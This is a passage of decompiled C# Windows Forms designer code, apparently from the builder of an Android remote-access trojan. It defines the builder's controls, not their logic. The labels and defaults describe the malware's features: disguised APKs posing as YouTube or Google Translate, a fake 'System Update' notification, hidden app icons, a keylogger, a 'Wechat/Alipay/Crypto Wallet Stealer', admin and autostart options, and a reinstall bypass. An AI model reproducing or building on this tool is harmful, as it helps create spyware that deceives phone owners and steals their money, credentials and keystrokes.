		this.sizelabel.Text = "App Size";
		this.Label30.AutoSize = true;
		this.Label30.BackColor = System.Drawing.Color.Transparent;
		this.Label30.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label30.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label30.Location = new System.Drawing.Point(123, 364);
		this.Label30.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label30.Name = "Label30";
		this.Label30.Size = new System.Drawing.Size(28, 17);
		this.Label30.TabIndex = 46;
		this.Label30.Text = "MB";
		this.Panel4.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.Panel4.Controls.Add(this.Label28);
		this.Panel4.Controls.Add(this.Nottitle);
		this.Panel4.Controls.Add(this.Label25);
		this.Panel4.Controls.Add(this.Label24);
		this.Panel4.Controls.Add(this.Notmsg);
		this.Panel4.Location = new System.Drawing.Point(436, 340);
		this.Panel4.Margin = new System.Windows.Forms.Padding(4);
		this.Panel4.Name = "Panel4";
		this.Panel4.Size = new System.Drawing.Size(518, 240);
		this.Panel4.TabIndex = 47;
		this.Label28.AutoSize = true;
		this.Label28.BackColor = System.Drawing.Color.Transparent;
		this.Label28.Font = new System.Drawing.Font("Calibri", 18f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label28.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label28.Location = new System.Drawing.Point(119, 37);
		this.Label28.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label28.Name = "Label28";
		this.Label28.Size = new System.Drawing.Size(213, 29);
		this.Label28.TabIndex = 48;
		this.Label28.Text = "Write Custom Notification Text";
		this.Nottitle.BackColor = System.Drawing.Color.FromArgb(34, 34, 34);
		this.Nottitle.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.Nottitle.ForeColor = System.Drawing.Color.SkyBlue;
		this.Nottitle.Location = new System.Drawing.Point(184, 111);
		this.Nottitle.Margin = new System.Windows.Forms.Padding(4);
		this.Nottitle.Name = "Nottitle";
		this.Nottitle.Size = new System.Drawing.Size(327, 27);
		this.Nottitle.TabIndex = 41;
		this.Nottitle.Text = "System Update Runing";
		this.Nottitle.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.Label25.AutoSize = true;
		this.Label25.BackColor = System.Drawing.Color.Transparent;
		this.Label25.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label25.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label25.Location = new System.Drawing.Point(4, 175);
		this.Label25.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label25.Name = "Label25";
		this.Label25.Size = new System.Drawing.Size(133, 17);
		this.Label25.TabIndex = 44;
		this.Label25.Text = "Notification Message";
		this.Label24.AutoSize = true;
		this.Label24.BackColor = System.Drawing.Color.Transparent;
		this.Label24.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label24.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label24.Location = new System.Drawing.Point(4, 114);
		this.Label24.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label24.Name = "Label24";
		this.Label24.Size = new System.Drawing.Size(106, 17);
		this.Label24.TabIndex = 43;
		this.Label24.Text = "Notification Title";
		this.Notmsg.BackColor = System.Drawing.Color.FromArgb(34, 34, 34);
		this.Notmsg.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.Notmsg.ForeColor = System.Drawing.Color.SkyBlue;
		this.Notmsg.Location = new System.Drawing.Point(184, 171);
		this.Notmsg.Margin = new System.Windows.Forms.Padding(4);
		this.Notmsg.Name = "Notmsg";
		this.Notmsg.Size = new System.Drawing.Size(327, 27);
		this.Notmsg.TabIndex = 42;
		this.Notmsg.Text = "New system software is available, Please Update New Version.";
		this.Notmsg.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.Label12.AutoSize = true;
		this.Label12.BackColor = System.Drawing.Color.Transparent;
		this.Label12.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label12.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label12.Location = new System.Drawing.Point(37, 481);
		this.Label12.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label12.Name = "Label12";
		this.Label12.Size = new System.Drawing.Size(19, 24);
		this.Label12.TabIndex = 35;
		this.Label12.Text = "*";
		this.TextSize.BackColor = System.Drawing.Color.FromArgb(34, 34, 34);
		this.TextSize.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.TextSize.ForeColor = System.Drawing.Color.SkyBlue;
		this.TextSize.Location = new System.Drawing.Point(71, 328);
		this.TextSize.Margin = new System.Windows.Forms.Padding(4);
		this.TextSize.Name = "TextSize";
		this.TextSize.Size = new System.Drawing.Size(82, 27);
		this.TextSize.TabIndex = 45;
		this.TextSize.Text = "5";
		this.TextSize.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.keeplivelabel.AutoSize = true;
		this.keeplivelabel.BackColor = System.Drawing.Color.Transparent;
		this.keeplivelabel.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.keeplivelabel.ForeColor = System.Drawing.Color.SkyBlue;
		this.keeplivelabel.Location = new System.Drawing.Point(121, 482);
		this.keeplivelabel.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.keeplivelabel.Name = "keeplivelabel";
		this.keeplivelabel.Size = new System.Drawing.Size(98, 24);
		this.keeplivelabel.TabIndex = 28;
		this.keeplivelabel.Text = "Keep Alive Cobra";
		this.fakepanel.BackColor = System.Drawing.Color.Black;
		this.fakepanel.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.fakepanel.Controls.Add(this.Button1);
		this.fakepanel.Controls.Add(this.Textfakelink);
		this.fakepanel.Controls.Add(this.Textfakename);
		this.fakepanel.Controls.Add(this.Label27);
		this.fakepanel.Controls.Add(this.fakeiconpic);
		this.fakepanel.Controls.Add(this.Label23);
		this.fakepanel.Controls.Add(this.Label22);
		this.fakepanel.Enabled = false;
		this.fakepanel.Location = new System.Drawing.Point(436, 36);
		this.fakepanel.Margin = new System.Windows.Forms.Padding(4);
		this.fakepanel.Name = "fakepanel";
		this.fakepanel.Size = new System.Drawing.Size(518, 290);
		this.fakepanel.TabIndex = 40;
		this.Button1.BackColor = System.Drawing.Color.Transparent;
		this.Button1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Button1.FillColor = System.Drawing.Color.Transparent;
		this.Button1.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.Button1.FillPressColor = System.Drawing.Color.Black;
		this.Button1.FillSelectedColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.Button1.Font = new System.Drawing.Font("Calibri", 12f);
		this.Button1.ForePressColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.Button1.Location = new System.Drawing.Point(15, 217);
		this.Button1.Margin = new System.Windows.Forms.Padding(4);
		this.Button1.Name = "Button1";
		this.Button1.Radius = 10;
		this.Button1.RectColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Button1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Button1.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.Button1.RectPressColor = System.Drawing.Color.SkyBlue;
		this.Button1.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.Button1.Size = new System.Drawing.Size(156, 32);
		this.Button1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Button1.SymbolSize = 0;
		this.Button1.TabIndex = 97;
		this.Button1.Text = "ApK icon";
		this.Textfakelink.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Textfakelink.FillColor = System.Drawing.Color.Black;
		this.Textfakelink.Font = new System.Drawing.Font("Calibri", 12f);
		this.Textfakelink.ForeColor = System.Drawing.Color.Green;
		this.Textfakelink.Location = new System.Drawing.Point(231, 144);
		this.Textfakelink.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.Textfakelink.Maximum = 2147483647.0;
		this.Textfakelink.Minimum = -2147483648.0;
		this.Textfakelink.Name = "Textfakelink";
		this.Textfakelink.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.Textfakelink.Radius = 10;
		this.Textfakelink.RectColor = System.Drawing.Color.SkyBlue;
		this.Textfakelink.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Textfakelink.Size = new System.Drawing.Size(262, 27);
		this.Textfakelink.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Textfakelink.TabIndex = 96;
		this.Textfakelink.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Textfakelink.Watermark = "Web site link";
		this.Textfakename.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Textfakename.FillColor = System.Drawing.Color.Black;
		this.Textfakename.Font = new System.Drawing.Font("Calibri", 12f);
		this.Textfakename.ForeColor = System.Drawing.Color.SkyBlue;
		this.Textfakename.Location = new System.Drawing.Point(231, 84);
		this.Textfakename.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.Textfakename.Maximum = 2147483647.0;
		this.Textfakename.Minimum = -2147483648.0;
		this.Textfakename.Name = "Textfakename";
		this.Textfakename.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.Textfakename.Radius = 10;
		this.Textfakename.RectColor = System.Drawing.Color.SkyBlue;
		this.Textfakename.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Textfakename.Size = new System.Drawing.Size(262, 27);
		this.Textfakename.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Textfakename.TabIndex = 95;
		this.Textfakename.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Textfakename.Watermark = "App Name";
		this.Label27.AutoSize = true;
		this.Label27.BackColor = System.Drawing.Color.Transparent;
		this.Label27.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label27.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label27.Location = new System.Drawing.Point(178, 12);
		this.Label27.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label27.Name = "Label27";
		this.Label27.Size = new System.Drawing.Size(113, 24);
		this.Label27.TabIndex = 44;
		this.Label27.Text = "Custom ApK";
		this.fakeiconpic.BackColor = System.Drawing.Color.SkyBlue;
		this.fakeiconpic.Location = new System.Drawing.Point(323, 199);
		this.fakeiconpic.Margin = new System.Windows.Forms.Padding(4);
		this.fakeiconpic.Name = "fakeiconpic";
		this.fakeiconpic.Size = new System.Drawing.Size(97, 63);
		this.fakeiconpic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.fakeiconpic.TabIndex = 42;
		this.fakeiconpic.TabStop = false;
		this.Label23.AutoSize = true;
		this.Label23.BackColor = System.Drawing.Color.Transparent;
		this.Label23.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label23.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label23.Location = new System.Drawing.Point(11, 144);
		this.Label23.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label23.Name = "Label23";
		this.Label23.Size = new System.Drawing.Size(112, 17);
		this.Label23.TabIndex = 39;
		this.Label23.Text = "App WebSite Link";
		this.Label22.AutoSize = true;
		this.Label22.BackColor = System.Drawing.Color.Transparent;
		this.Label22.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label22.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label22.Location = new System.Drawing.Point(11, 95);
		this.Label22.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label22.Name = "Label22";
		this.Label22.Size = new System.Drawing.Size(69, 17);
		this.Label22.TabIndex = 38;
		this.Label22.Text = "App Name";
		this.Label21.AutoSize = true;
		this.Label21.BackColor = System.Drawing.Color.Transparent;
		this.Label21.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label21.ForeColor = System.Drawing.Color.FromArgb(65, 177, 225);
		this.Label21.Location = new System.Drawing.Point(37, 162);
		this.Label21.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label21.Name = "Label21";
		this.Label21.Size = new System.Drawing.Size(19, 24);
		this.Label21.TabIndex = 39;
		this.Label21.Text = "*";
		this.combotype.AllowDrop = true;
		this.combotype.BackColor = System.Drawing.Color.Transparent;
		this.combotype.CausesValidation = false;
		this.combotype.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combotype.FillColor = System.Drawing.Color.Black;
		this.combotype.Font = new System.Drawing.Font("Calibri", 11f);
		this.combotype.ForeColor = System.Drawing.Color.SkyBlue;
		this.combotype.FormattingEnabled = true;
		this.combotype.ItemHeight = 20;
		this.combotype.Items.AddRange(new object[8] { "Youtube Apk", "Temp Mail Apk", "Google Translate Apk", "Wallpapers ApK", "App Store Apk", "Proxy ApK", "Make Custom Apk", "Hidden ApK Icon" });
		this.combotype.Location = new System.Drawing.Point(71, 162);
		this.combotype.Margin = new System.Windows.Forms.Padding(4);
		this.combotype.MinimumSize = new System.Drawing.Size(63, 0);
		this.combotype.Name = "combotype";
		this.combotype.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combotype.RectColor = System.Drawing.Color.SkyBlue;
		this.combotype.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combotype.Size = new System.Drawing.Size(123, 25);
		this.combotype.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combotype.TabIndex = 38;
		this.combotype.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label20.AutoSize = true;
		this.Label20.BackColor = System.Drawing.Color.Transparent;
		this.Label20.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label20.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label20.Location = new System.Drawing.Point(202, 162);
		this.Label20.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label20.Name = "Label20";
		this.Label20.Size = new System.Drawing.Size(108, 24);
		this.Label20.TabIndex = 37;
		this.Label20.Text = "After ApK Install";
		this.Label7.AutoSize = true;
		this.Label7.BackColor = System.Drawing.Color.Transparent;
		this.Label7.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label7.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label7.Location = new System.Drawing.Point(1336, 148);
		this.Label7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(19, 24);
		this.Label7.TabIndex = 34;
		this.Label7.Text = "*";
		this.ToolTip1.SetToolTip(this.Label7, "Hide App icon From phone\r\nSet FakeApp To Hidden App\r\nto hide on Android 13/14/15");
		this.Label5.AutoSize = true;
		this.Label5.BackColor = System.Drawing.Color.Transparent;
		this.Label5.Enabled = false;
		this.Label5.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label5.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label5.Location = new System.Drawing.Point(1156, 331);
		this.Label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(64, 24);
		this.Label5.TabIndex = 26;
		this.Label5.Text = "• Hide";
		this.Label5.Visible = false;
		this.CheckFakeSize.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckFakeSize.Checked = true;
		this.CheckFakeSize.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckFakeSize.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckFakeSize.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckFakeSize.Location = new System.Drawing.Point(183, 584);
		this.CheckFakeSize.Margin = new System.Windows.Forms.Padding(4);
		this.CheckFakeSize.Name = "CheckFakeSize";
		this.CheckFakeSize.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckFakeSize.Size = new System.Drawing.Size(155, 36);
		this.CheckFakeSize.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckFakeSize.TabIndex = 47;
		this.CheckFakeSize.Text = "Fake Apk Size";
		this.CheckFakeSize.Visible = false;
		this.TabPage11.BackColor = System.Drawing.Color.SkyBlue;
		this.TabPage11.Controls.Add(this.Panel5);
		this.TabPage11.Location = new System.Drawing.Point(0, 55);
		this.TabPage11.Name = "TabPage11";
		this.TabPage11.Size = new System.Drawing.Size(1004, 677);
		this.TabPage11.TabIndex = 3;
		this.TabPage11.Text = "Tools";
		this.Panel5.BackColor = System.Drawing.Color.Black;
		this.Panel5.Controls.Add(this.Label11);
		this.Panel5.Controls.Add(this.CheckAOX);
		this.Panel5.Controls.Add(this.Label50);
		this.Panel5.Controls.Add(this.checkunlocker);
		this.Panel5.Controls.Add(this.Label49);
		this.Panel5.Controls.Add(this.checknetwork);
		this.Panel5.Controls.Add(this.Label47);
		this.Panel5.Controls.Add(this.Label46);
		this.Panel5.Controls.Add(this.Label45);
		this.Panel5.Controls.Add(this.bindCtitle);
		this.Panel5.Controls.Add(this.Label10);
		this.Panel5.Controls.Add(this.CheckSkipre);
		this.Panel5.Controls.Add(this.bndbtntext);
		this.Panel5.Controls.Add(this.bindbodytext);
		this.Panel5.Controls.Add(this.cusomupdateimg);
		this.Panel5.Controls.Add(this.trgtbkg);
		this.Panel5.Controls.Add(this.Label41);
		this.Panel5.Controls.Add(this.checkkeepsscreen);
		this.Panel5.Controls.Add(this.CheckHidePrims);
		this.Panel5.Controls.Add(this.Label38);
		this.Panel5.Controls.Add(this.checkadmin);
		this.Panel5.Controls.Add(this.checkautostart);
		this.Panel5.Controls.Add(this.Label34);
		this.Panel5.Controls.Add(this.Label43);
		this.Panel5.Controls.Add(this.delayaccesstext);
		this.Panel5.Controls.Add(this.delaylabelaccess);
		this.Panel5.Controls.Add(this.CheckBIND);
		this.Panel5.Controls.Add(this.CheckDraw);
		this.Panel5.Controls.Add(this.checkemo);
		this.Panel5.Controls.Add(this.Checksuper);
		this.Panel5.Controls.Add(this.checkkeyloger);
		this.Panel5.Controls.Add(this.CheckQuick);
		this.Panel5.Controls.Add(this.Label35);
		this.Panel5.Controls.Add(this.explaintoolstext);
		this.Panel5.Controls.Add(this.Label33);
		this.Panel5.Controls.Add(this.Label17);
		this.Panel5.Controls.Add(this.Label16);
		this.Panel5.Controls.Add(this.Label14);
		this.Panel5.Controls.Add(this.Label6);
		this.Panel5.Controls.Add(this.CheckRecord);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(0, 0);
		this.Panel5.Margin = new System.Windows.Forms.Padding(4);
		this.Panel5.Name = "Panel5";
		this.Panel5.Size = new System.Drawing.Size(1004, 677);
		this.Panel5.TabIndex = 47;
		this.Label11.AutoSize = true;
		this.Label11.BackColor = System.Drawing.Color.Transparent;
		this.Label11.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label11.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label11.Location = new System.Drawing.Point(55, 447);
		this.Label11.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label11.Name = "Label11";
		this.Label11.Size = new System.Drawing.Size(16, 19);
		this.Label11.TabIndex = 108;
		this.Label11.Text = "*";
		this.CheckAOX.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckAOX.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckAOX.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckAOX.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckAOX.Location = new System.Drawing.Point(83, 448);
		this.CheckAOX.Name = "CheckAOX";
		this.CheckAOX.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckAOX.Size = new System.Drawing.Size(403, 29);
		this.CheckAOX.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckAOX.TabIndex = 107;
		this.CheckAOX.Text = "Hide The Icon After Uninstall Apk";
		this.Label50.AutoSize = true;
		this.Label50.BackColor = System.Drawing.Color.Transparent;
		this.Label50.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label50.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label50.Location = new System.Drawing.Point(55, 413);
		this.Label50.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label50.Name = "Label50";
		this.Label50.Size = new System.Drawing.Size(16, 19);
		this.Label50.TabIndex = 106;
		this.Label50.Text = "*";
		this.checkunlocker.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkunlocker.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkunlocker.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkunlocker.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkunlocker.Location = new System.Drawing.Point(83, 410);
		this.checkunlocker.Name = "checkunlocker";
		this.checkunlocker.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkunlocker.Size = new System.Drawing.Size(338, 29);
		this.checkunlocker.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkunlocker.TabIndex = 105;
		this.checkunlocker.Text = "Wechat/Alipay/Crypto Wallet Stealer";
		this.Label49.AutoSize = true;
		this.Label49.BackColor = System.Drawing.Color.Transparent;
		this.Label49.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label49.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label49.Location = new System.Drawing.Point(55, 165);
		this.Label49.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label49.Name = "Label49";
		this.Label49.Size = new System.Drawing.Size(16, 19);
		this.Label49.TabIndex = 104;
		this.Label49.Text = "*";
		this.checknetwork.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checknetwork.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checknetwork.Font = new System.Drawing.Font("Calibri", 12f);
		this.checknetwork.ForeColor = System.Drawing.Color.SkyBlue;
		this.checknetwork.Location = new System.Drawing.Point(83, 165);
		this.checknetwork.Name = "checknetwork";
		this.checknetwork.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checknetwork.Size = new System.Drawing.Size(338, 29);
		this.checknetwork.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checknetwork.TabIndex = 103;
		this.checknetwork.Text = "Use Mobile With Data With Background";
		this.Label47.AutoSize = true;
		this.Label47.BackColor = System.Drawing.Color.Transparent;
		this.Label47.Enabled = false;
		this.Label47.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label47.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label47.Location = new System.Drawing.Point(493, 442);
		this.Label47.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label47.Name = "Label47";
		this.Label47.Size = new System.Drawing.Size(82, 24);
		this.Label47.TabIndex = 102;
		this.Label47.Text = "Button >";
		this.Label46.AutoSize = true;
		this.Label46.BackColor = System.Drawing.Color.Transparent;
		this.Label46.Enabled = false;
		this.Label46.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label46.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label46.Location = new System.Drawing.Point(470, 326);
		this.Label46.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label46.Name = "Label46";
		this.Label46.Size = new System.Drawing.Size(97, 24);
		this.Label46.TabIndex = 101;
		this.Label46.Text = "Message >";
		this.Label45.AutoSize = true;
		this.Label45.BackColor = System.Drawing.Color.Transparent;
		this.Label45.Enabled = false;
		this.Label45.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label45.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label45.Location = new System.Drawing.Point(516, 183);
		this.Label45.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label45.Name = "Label45";
		this.Label45.Size = new System.Drawing.Size(62, 24);
		this.Label45.TabIndex = 100;
		this.Label45.Text = "Title >";
		this.bindCtitle.BackColor = System.Drawing.Color.SkyBlue;
		this.bindCtitle.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.bindCtitle.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.bindCtitle.ForeColor = System.Drawing.Color.SkyBlue;
		this.bindCtitle.Location = new System.Drawing.Point(644, 191);
		this.bindCtitle.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.bindCtitle.Multiline = true;
		this.bindCtitle.Name = "bindCtitle";
		this.bindCtitle.Size = new System.Drawing.Size(275, 23);
		this.bindCtitle.TabIndex = 99;
		this.bindCtitle.Text = "App Name";
		this.bindCtitle.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.Label10.AutoSize = true;
		this.Label10.BackColor = System.Drawing.Color.Transparent;
		this.Label10.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label10.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label10.Location = new System.Drawing.Point(574, 88);
		this.Label10.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label10.Name = "Label10";
		this.Label10.Size = new System.Drawing.Size(16, 19);
		this.Label10.TabIndex = 98;
		this.Label10.Text = "*";
		this.CheckSkipre.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.CheckSkipre.Cursor = System.Windows.Forms.Cursors.Hand;
		this.CheckSkipre.Enabled = false;
		this.CheckSkipre.Font = new System.Drawing.Font("Calibri", 12f);
		this.CheckSkipre.ForeColor = System.Drawing.Color.SkyBlue;
		this.CheckSkipre.Location = new System.Drawing.Point(602, 88);
		this.CheckSkipre.Name = "CheckSkipre";
		this.CheckSkipre.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.CheckSkipre.Size = new System.Drawing.Size(363, 29);
		this.CheckSkipre.Style = DrakeUI.Framework.UIStyle.Custom;
		this.CheckSkipre.TabIndex = 97;
		this.CheckSkipre.Text = "Bypass Reinstall";
		this.CheckSkipre.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.bndbtntext.BackColor = System.Drawing.Color.FromArgb(0, 0, 17);
		this.bndbtntext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.bndbtntext.FillColor = System.Drawing.Color.FromArgb(0, 39, 81);
		this.bndbtntext.Font = new System.Drawing.Font("Calibri", 16f);
		this.bndbtntext.ForeColor = System.Drawing.Color.SkyBlue;
		this.bndbtntext.Location = new System.Drawing.Point(730, 437);
		this.bndbtntext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.bndbtntext.Maximum = 2147483647.0;
		this.bndbtntext.Minimum = -2147483648.0;
		this.bndbtntext.Name = "bndbtntext";
		this.bndbtntext.Padding = new System.Windows.Forms.Padding(5);
		this.bndbtntext.Radius = 15;
		this.bndbtntext.RectColor = System.Drawing.Color.FromArgb(0, 0, 17);
		this.bndbtntext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.bndbtntext.Size = new System.Drawing.Size(108, 34);
		this.bndbtntext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.bndbtntext.TabIndex = 96;
		this.bndbtntext.Text = "install";
		this.bndbtntext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.bindbodytext.BackColor = System.Drawing.Color.FromArgb(0, 0, 17);
		this.bindbodytext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.bindbodytext.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.bindbodytext.ForeColor = System.Drawing.Color.SkyBlue;
		this.bindbodytext.Location = new System.Drawing.Point(646, 307);
		this.bindbodytext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.bindbodytext.Multiline = true;
		this.bindbodytext.Name = "bindbodytext";
		this.bindbodytext.Size = new System.Drawing.Size(275, 87);
		this.bindbodytext.TabIndex = 95;
		this.bindbodytext.Text = "New update available";
		this.bindbodytext.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.cusomupdateimg.BackColor = System.Drawing.Color.Black;
		this.cusomupdateimg.Enabled = false;
		this.cusomupdateimg.Image = (System.Drawing.Image)resources.GetObject("cusomupdateimg.Image");
		this.cusomupdateimg.Location = new System.Drawing.Point(602, 123);
		this.cusomupdateimg.Margin = new System.Windows.Forms.Padding(4);
		this.cusomupdateimg.Name = "cusomupdateimg";
		this.cusomupdateimg.Size = new System.Drawing.Size(363, 409);
		this.cusomupdateimg.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.cusomupdateimg.TabIndex = 94;
